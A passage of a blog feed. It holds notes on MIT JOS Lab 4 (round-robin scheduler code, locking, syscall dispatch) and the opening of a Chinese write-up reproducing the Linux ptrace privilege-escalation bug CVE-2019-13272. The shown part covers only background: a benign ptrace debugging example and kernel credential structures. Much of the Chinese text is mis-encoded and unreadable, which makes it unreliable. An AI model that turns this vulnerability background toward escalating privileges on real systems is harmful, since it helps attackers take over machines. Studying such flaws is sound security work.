run the program <code>user/yield.c</code>.</p><p>Run make qemu. You should see the environments switch back and forth between each other five times before terminating, like below.</p><p>Test also with several CPUS: make qemu CPUS=2.</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs erlang">...<br>Hello, I am environment <span class="hljs-number">00001000</span>.<br>Hello, I am environment <span class="hljs-number">00001001</span>.<br>Hello, I am environment <span class="hljs-number">00001002</span>.<br>Back in environment <span class="hljs-number">00001000</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001001</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001002</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001000</span>, iteration <span class="hljs-number">1</span>.<br>Back in environment <span class="hljs-number">00001001</span>, iteration <span class="hljs-number">1</span>.<br>Back in environment <span class="hljs-number">00001002</span>, iteration <span class="hljs-number">1</span>.<br>...<br></code></pre></td></tr></table></figure><p>After the <code>yield</code> programs exit, there will be no runnable environment in the system, the scheduler should invoke the JOS kernel monitor. If any of this does not happen, then fix your code before proceeding.</p></blockquote><p>å‰é¢çš„ Challenge è¯´åˆ°ä¸º scheduler åŠ é”ï¼Œå› æ­¤ç¬”è€…é€‰æ‹©åœ¨ <code>kern/env.h</code> ä¸­å£°æ˜ä¸€ä¸ªè‡ªæ—‹é”ï¼Œå®šä¹‰æ”¾åœ¨ <code>kern/env.c</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">sched_lock</span>;</span><span class="hljs-comment">// lock for Env in scheduler</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>env_init()</code> ä¸­å¯¹å…¶åˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br><span class="hljs-comment">// initialize the scheduler lock</span><br>__spin_initlock(&amp;sched_lock, <span class="hljs-string">&quot;scheduler lock&quot;</span>);<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯å®ç° <code>sched_yield()</code> äº†ï¼Œè¿™é‡Œä¸ºäº†ä¿è¯å…¬å¹³å› æ­¤æˆ‘ä»¬åº”å½“ä»å½“å‰è¿›ç¨‹å¾€åè¿›è¡Œéå†è€Œä¸æ˜¯æ¯æ¬¡éƒ½ä» env[0] å¼€å§‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è‹¥æˆ‘ä»¬è½®è¯¢ä¸€éè¿›ç¨‹æ•°ç»„å‘ç°æ²¡æœ‰å…¶ä»–å¯è¿è¡Œè¿›ç¨‹çš„è¯éœ€è¦è¿”å›åˆ°å‘èµ· yield çš„è¿›ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Choose a user environment to run and run it.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">sched_yield</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">idle</span>;</span><br><br><span class="hljs-comment">// Implement simple round-robin scheduling.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Search through &#x27;envs&#x27; for an ENV_RUNNABLE environment in</span><br><span class="hljs-comment">// circular fashion starting just after the env this CPU was</span><br><span class="hljs-comment">// last running.  Switch to the first such environment found.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If no envs are runnable, but the environment previously</span><br><span class="hljs-comment">// running on this CPU is still ENV_RUNNING, it&#x27;s okay to</span><br><span class="hljs-comment">// choose that environment.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Never choose an environment that&#x27;s currently running on</span><br><span class="hljs-comment">// another CPU (env_status == ENV_RUNNING). If there are</span><br><span class="hljs-comment">// no runnable environments, simply drop through to the code</span><br><span class="hljs-comment">// below to halt the cpu.</span><br><br><span class="hljs-comment">// LAB 4: Your code here.</span><br><span class="hljs-type">int</span> i, start_idx;<br><br>spin_lock(&amp;sched_lock);<br><br>idle = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (curenv)<br>start_idx = ENVX(curenv-&gt;env_id) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>start_idx = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// traversal envs</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NENV; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (envs[(start_idx + i) % NENV].env_status == ENV_RUNNABLE)<br>&#123;<br>idle = &amp;envs[(start_idx + i) % NENV];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// no other runnable, try to rerun curenv</span><br><span class="hljs-keyword">if</span> (!idle &amp;&amp; curenv <br>&amp;&amp; curenv-&gt;env_status == ENV_RUNNING<br>&amp;&amp; curenv-&gt;env_cpunum == cpunum())<br>idle = curenv;<br><br><span class="hljs-keyword">if</span> (idle)<br>&#123;<br>idle-&gt;env_status = ENV_RUNNING;<br>spin_unlock(&amp;sched_lock);<br>env_run(idle);<br>&#125;<br><br>spin_unlock(&amp;sched_lock);<br><span class="hljs-comment">// sched_halt never returns</span><br>sched_halt();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çš„è‡ªæ—‹é”è¿˜éœ€è¦ä¿æŠ¤æ•´ä¸ª env æ•°ç»„ï¼Œåœ¨ <code>env_alloc()</code> ä¸ <code>env_free()</code> ä¸Šå¥—ä¸€å±‚ wrapperï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <br><span class="hljs-title function_">env_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env **newenv_store, <span class="hljs-type">envid_t</span> parent_id)</span><br>&#123;<br><span class="hljs-type">int</span> res;<br><br>spin_lock(&amp;sched_lock);<br>res = __env_alloc(newenv_store, parent_id);<br>spin_unlock(&amp;sched_lock);<br><br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br>spin_lock(&amp;sched_lock);<br>__env_free(e);<br>spin_unlock(&amp;sched_lock);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç¬”è€…ä¸ºäº†å®ŒæˆåŠ é”çš„é‚£ä¸ª Challengeï¼Œèµ°äº†ä¸å°‘å¼¯è·¯â€¦ä¹Ÿæ‰äº†å‡ æ¬¡å‘â€¦</p></blockquote><p>åˆ«å¿˜äº†åœ¨ <code>kern/syscall.c</code> ä¸­è¡¥å……ä¸Šå¯¹ <code>sys_yield()</code> çš„è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Dispatches to the correct kernel function, passing the arguments.</span><br><span class="hljs-type">int32_t</span><br><span class="hljs-title function_">syscall</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> syscallno, <span class="hljs-type">uint32_t</span> a1, <span class="hljs-type">uint32_t</span> a2, <span class="hljs-type">uint32_t</span> a3, <span class="hljs-type">uint32_t</span> a4, <span class="hljs-type">uint32_t</span> a5)</span><br>&#123;<br><span class="hljs-comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span><br><span class="hljs-comment">// Return any appropriate return value.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// panic(&quot;syscall not implemented&quot;);</span><br><br><span class="hljs-keyword">switch</span> (syscallno) &#123;<br><span class="hljs-keyword">case</span> SYS_cputs:<br>sys_cputs((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)a1, a2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SYS_cgetc:<br><span class="hljs-keyword">return</span> sys_cgetc();<br><span class="hljs-keyword">case</span> SYS_getenvid:<br><span class="hljs-keyword">return</span> sys_getenvid();<br><span class="hljs-keyword">case</span> SYS_env_destroy:<br><span class="hljs-keyword">return</span> sys_env_destroy(a1);<br><span class="hljs-keyword">case</span> SYS_yield:<br>sys_yield();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯ä¹ é¢˜ Timeï¼š</p><blockquote><p><strong>Question</strong></p><ol><li>In your implementation of <code>env_run()</code> you should have called <code>lcr3()</code>. Before and after the call to <code>lcr3()</code>, your code makes references (at least it should) to the variable <code>e</code>, the argument to <code>env_run</code>. Upon loading the <code>%cr3</code> register, the addressing context used by the MMU is instantly changed. But a virtual address (namely <code>e</code>) has meaning relative to a given address contextâ€“the address context specifies the physical address to which the virtual address maps. Why can the pointer <code>e</code> be dereferenced both before and after the addressing switch?</li><li>Whenever the kernel switches from one environment to another, it must ensure the old environmentâ€™s registers are saved so they can be restored properly later. Why? Where does this happen?</li></ol></blockquote><p>ä¸¤ä¸ª Challengeï¼Œ</p><blockquote><p><em>Challenge!</em> Add a less trivial scheduling policy to the kernel, such as a fixed-priority scheduler that allows each environment to be assigned a priority and ensures that higher-priority environments are always chosen in preference to lower-priority environments. If youâ€™re feeling really adventurous, try implementing a Unix-style adjustable-priority scheduler or even a lottery or stride scheduler. (Look up â€œlottery schedulingâ€ and â€œstride schedulingâ€ in Google.)</p><p>Write a test program or two that verifies that your scheduling algorithm is working correctly (i.e., the right environments get run in the right order). It may be easier to write these test programs once you have implemented <code>fork()</code> and IPC in parts B and C of this lab.</p></blockquote><blockquote><p><em>Challenge!</em> The JOS kernel currently does not allow applications to use the x86 processorâ€™s x87 floating-point unit (FPU), MMX instructions, or Streaming SIMD Extensions (SSE). Extend the <code>Env</code> structure to provide a save area for the processorâ€™s floating point state, and extend the context switching code to save and restore this state properly when switching from one environment to another. The <code>FXSAVE</code> and <code>FXRSTOR</code> instructions may be useful, but note that these are not in the old i386 userâ€™s manual because they were introduced in more recent processors. Write a user-level test program that does something cool with floating-point.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸å¦‚ Windows XP å¥½ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="å®éªŒç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://blog.arttnba3.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="XV6" scheme="http://blog.arttnba3.cn/tags/XV6/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x05ã€‘CVE-2019-13272 ptrace æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/"/>
    <id>http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/</id>
    <published>2022-01-16T17:49:56.000Z</published>
    <updated>2022-01-16T17:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä½ ä¸è®¸è¯´ä»–ï¼Œä»–æ˜¯ä½ çˆ¹ï¼Ÿ</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2019-13272 æ˜¯è‡ª Linux v4.11 ç‰ˆæœ¬èµ·å¼•å…¥çš„ä¸€ä¸ªæœ¬åœ°ææƒæ¼æ´ï¼Œç”±æ¥è‡ª Google Zero Project å®‰å…¨å›¢é˜Ÿçš„  Jann Horn ï¼ˆ<s>å¾ˆå¸…æ°”çš„å¤–å›½å°å“¥</s>ï¼‰äº 2019 å¹´ 9 æœˆå‘ç°ï¼Œè¯¥æ¼æ´çš„æˆå› ä¸»è¦æ˜¯ ptrace ç³»ç»Ÿè°ƒç”¨ä¸­ <code>PTRACE_TRACEME</code> å‚æ•°è°ƒç”¨è·¯å¾„ä¸Šçš„ <code>ptrace_link()</code> å‡½æ•°é”™è¯¯åœ°å¤„ç†äº†æƒ³è¦åˆ›å»º ptrace å…³ç³»çš„è¿›ç¨‹é—´çš„å‡­æ®è®°å½•ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ suid ç¨‹åºå®ç°æœ¬åœ°ææƒ</p><p>è¯¥æ¼æ´å½±å“ç‰ˆæœ¬ä» <code>v4.11</code> åˆ° <code>v5.1.17</code>ï¼Œä¸è¿‡<strong>åªèƒ½åœ¨æœ‰ç€æ¡Œé¢ç¯å¢ƒçš„æƒ…å†µä¸‹å®Œæˆææƒ</strong>ï¼Œå› ä¸ºææƒéœ€è¦ç”¨åˆ°ä¸€ä¸ªé€šå¸¸åªåœ¨æ¡Œé¢ç¯å¢ƒä¸‹å­˜åœ¨çš„ <em>helperç¨‹åº</em> ï¼Œæ‰€ä»¥ç›¸å¯¹æ¯”è¾ƒé¸¡è‚‹</p><p>åœ¨åˆ†æè¯¥æ¼æ´ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¡¥å……ä¸€äº›å‰ç½®çŸ¥è¯†</p><blockquote><p>ä»¥ä¸‹å†…æ ¸æºç çš†æ¥è‡ªäº Linux v4.11</p></blockquote><h2 id="ptrace-ç³»ç»Ÿè°ƒç”¨">ptrace ç³»ç»Ÿè°ƒç”¨</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">ptrace</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> __ptrace_request request, <span class="hljs-type">pid_t</span> pid,</span><br><span class="hljs-params">                   <span class="hljs-type">void</span> *addr, <span class="hljs-type">void</span> *data)</span>;<br></code></pre></td></tr></table></figure><p>ptrace ç³»ç»Ÿè°ƒç”¨ä¸»è¦ç”¨äºå¯¹è¿›ç¨‹è¿›è¡Œè°ƒè¯•ï¼šè¯¥ç³»ç»Ÿè°ƒç”¨æä¾›äº†ä¸€ç§æœºåˆ¶ä½¿å¾—è°ƒè¯•è¿›ç¨‹ï¼ˆptracerï¼‰å¯ä»¥è§‚å¯Ÿä¸æ§åˆ¶è¢«è°ƒè¯•è¿›ç¨‹ï¼ˆptraceeï¼‰çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¹¶ä¿®æ”¹è¢«è°ƒè¯•è¿›ç¨‹çš„å¯„å­˜å™¨åŠå†…å­˜ï¼Œä»è€Œæ“æ§è¢«è°ƒè¯•è¿›ç¨‹å®ç°ç‰¹å®šçš„è¡Œä¸º</p><blockquote><p>ç›¸ä¿¡å¤§å®¶å¯¹è¿™ä¸ªç³»ç»Ÿè°ƒç”¨åº”è¯¥éƒ½ä¸é™Œç”Ÿï¼Œgdb è°ƒè¯•ä¾¿æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç³»ç»Ÿè°ƒç”¨</p></blockquote><p>å¸¸è§çš„å»ºç«‹ ptrace è¿æ¥æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>å­è¿›ç¨‹é€šè¿‡ <code>PTRACE_TRACEME</code> è¯·æ±‚çˆ¶è¿›ç¨‹è¿›è¡Œè°ƒè¯•</li><li>çˆ¶è¿›ç¨‹é€šè¿‡ <code>PTRACE_ATTACH</code> ä¸»åŠ¨å¯¹æŒ‡å®šè¿›ç¨‹è¿›è¡Œè°ƒè¯•</li></ul><p>è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯å‡ºç°åœ¨ç¬¬ä¸€æ¡è·¯å¾„ä¸­ï¼Œå› æ­¤æˆ‘ä»¬ä¸‹æ–‡ä¸»è¦é’ˆå¯¹ç¬¬ä¸€æ¡è·¯å¾„è¿›è¡Œåˆ†æ</p><p>ä¸€ä¸ªå…¸å‹çš„é€šè¿‡ ptrace ç”±çˆ¶è¿›ç¨‹å¯¹å­è¿›ç¨‹è¿›è¡Œå•æ­¥è°ƒè¯•çš„ä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> wait_val;<br>    <span class="hljs-type">int</span> instructions = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> child_pid = fork();<br>    <span class="hljs-keyword">if</span> (!child_pid) <span class="hljs-comment">// child</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Set the child as a ptracee.&quot;</span>);<br>        ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// let the parent ptrace it, won&#x27;t stop there but send a signal to parent</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done. Now waiting for the parent...&quot;</span>);<br>        execl(<span class="hljs-string">&quot;./helloworld&quot;</span>, <span class="hljs-string">&quot;helloworld&quot;</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// the programme to be debug</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// parent</span><br>    &#123;<br>        wait(&amp;wait_val); <span class="hljs-comment">// waiting for the signal from child</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Parent received signal, running...&quot;</span>);<br>        <span class="hljs-keyword">while</span> (wait_val == <span class="hljs-number">1407</span>) <br>        &#123;<br>            instructions++;<br>            <span class="hljs-keyword">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>)<br>                perror(<span class="hljs-string">&quot;ptrace error!&quot;</span>);<br>            <br>            wait(&amp;wait_val);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Done for %d instructions.\n&quot;</span>, instructions);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Parent quit.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/01/13/ZodQuBfgsrLCXlp.png" alt="image.png"></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œptrace <strong>åªèƒ½è°ƒè¯•å±äº ptracer æ‰€å±ç”¨æˆ·çš„è¿›ç¨‹</strong>ï¼Œä¾‹å¦‚æ™®é€šç”¨æˆ·ä¾¿ä¸èƒ½è°ƒè¯• root è¿›ç¨‹</p><h2 id="task-structï¼šè¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess-descriptorï¼‰">task_structï¼šè¿›ç¨‹æè¿°ç¬¦ï¼ˆprocess descriptorï¼‰</h2><p>åœ¨ Linux ä¸­ä¸€ä¸ªè¿›ç¨‹ä¾¿æ˜¯ä¸€ä¸ª taskï¼Œåœ¨ kernel ä¸­ä½¿ç”¨ä¸€ä¸ª <code>task_struct</code> ç»“æ„ä½“è¿›è¡Œæ ‡è¯†ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç <code>include/linux/sched.h</code>ä¸­</p><p>æˆ‘ä»¬ä¸»è¦å…³å¿ƒå…¶å¯¹äºè¿›ç¨‹æƒé™çš„ç®¡ç†ï¼Œæ³¨æ„åˆ°<code>task_struct</code>çš„æºç ä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process credentials: */</span><br><br><span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">ptracer_cred</span>;</span><br><br><span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">real_cred</span>;</span><br><br><span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">cred</span>;</span><br></code></pre></td></tr></table></figure><p><strong>Process credentials</strong> æ˜¯ kernel ç”¨ä»¥åˆ¤æ–­ä¸€ä¸ªè¿›ç¨‹æƒé™çš„å‡­è¯ï¼Œåœ¨ kernel ä¸­ä½¿ç”¨ <code>cred</code> ç»“æ„ä½“è¿›è¡Œæ ‡è¯†ï¼Œå¯¹äºä¸€ä¸ªè¿›ç¨‹è€Œè¨€åº”å½“æœ‰ä¸‰ä¸ª credï¼š</p><ul><li>**ptracer_credï¼š**ä½¿ç”¨<code>ptrace</code>ç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªè¯¥è¿›ç¨‹çš„è°ƒè¯•è¿›ç¨‹ï¼ˆptracerï¼‰çš„ cred</li><li><strong>real_credï¼š<strong>å³</strong>å®¢ä½“å‡­è¯</strong>ï¼ˆ<strong>objective cred</strong>ï¼‰ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªè¿›ç¨‹æœ€åˆå¯åŠ¨æ—¶æ‰€å…·æœ‰çš„æƒé™</li><li><strong>credï¼š<strong>å³</strong>ä¸»ä½“å‡­è¯</strong>ï¼ˆ<strong>subjective cred</strong>ï¼‰ï¼Œè¯¥è¿›ç¨‹çš„æœ‰æ•ˆcredï¼Œkernelä»¥æ­¤ä½œä¸ºè¿›ç¨‹æƒé™çš„å‡­è¯</li></ul><h2 id="credï¼šè¿›ç¨‹æƒé™å‡­è¯ï¼ˆcredentialsï¼‰">credï¼šè¿›ç¨‹æƒé™å‡­è¯ï¼ˆcredentialsï¼‰</h2><p>å¯¹äºä¸€ä¸ªè¿›ç¨‹ï¼Œåœ¨å†…æ ¸å½“ä¸­ä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“<code>cred</code>ç®¡ç†å…¶æƒé™ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç <code>include/linux/cred.h</code>ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br><span class="hljs-type">atomic_t</span>usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br><span class="hljs-type">atomic_t</span>subscribers;<span class="hljs-comment">/* number of processes subscribed */</span><br><span class="hljs-type">void</span>*put_addr;<br><span class="hljs-type">unsigned</span>magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">kuid_t</span>uid;<span class="hljs-comment">/* real UID of the task */</span><br><span 